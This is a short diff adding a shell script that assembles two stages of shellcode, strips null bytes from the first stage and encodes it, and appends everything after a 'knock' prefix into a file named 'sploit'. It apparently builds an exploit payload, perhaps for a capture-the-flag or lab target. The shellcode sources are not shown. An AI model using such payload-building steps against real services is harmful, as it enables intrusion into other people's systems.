@@ -1,0 +1,7 @@
+../../assembler -o stage_1 stage_1.s
+../../assembler -o stage_2 stage_2.s
+echo -n "knock" > sploit
+cat stage_1 | ./remove_null_bytes.py | ./encode.py >> sploit
+echo -n $'\x0a' | ./encode.py >> sploit
+cat stage_2 >> sploit
+echo -n $'\x99' >> sploit
